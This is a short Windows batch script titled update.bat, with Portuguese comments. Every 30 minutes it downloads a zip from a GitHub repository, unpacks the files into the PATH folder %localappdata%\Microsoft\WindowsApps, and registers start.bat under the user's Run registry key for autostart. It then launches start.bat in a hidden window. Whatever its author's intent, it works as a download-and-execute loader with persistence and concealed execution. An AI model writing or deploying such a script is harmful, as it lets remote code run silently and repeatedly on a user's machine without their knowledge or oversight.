@ECHO OFF
Title update.bat
:update
::baixa os arquivos do repositório hospedado no github
powershell.exe -c "Invoke-WebRequest -OutFile '%localappdata%\Microsoft\WindowsApps\main.zip' -Uri https://github.com/hulaneoTi/testes/archive/refs/heads/main.zip"
::descompacta o arquivo baixado
powershell.exe -c "Expand-Archive -Path '%localappdata%\Microsoft\WindowsApps\main.zip' -DestinationPath '%localappdata%\Microsoft\WindowsApps' -Force"
::lê todos os arquivos da pasta descompactada e salva numa lista em txt
dir /b %localappdata%\Microsoft\WindowsApps\testes-main > %localappdata%\Microsoft\WindowsApps\list.txt
::move os arquivos para pasta superior (que está naturalmente no PATH)
move %localappdata%\Microsoft\WindowsApps\testes-main\*.* %localappdata%\Microsoft\WindowsApps
::adiciona ao registro do windows o start.bat para inicializar com o sistema
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v start
if %errorlevel% neq 0 (
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v start /t REG_SZ /d %localappdata%\Microsoft\WindowsApps\start.bat /f
)
::chama start.bat
powershell "start start.bat -WindowStyle Hidden"
::espera 30 minutos para recomeçar
timeout 1800
CALL :update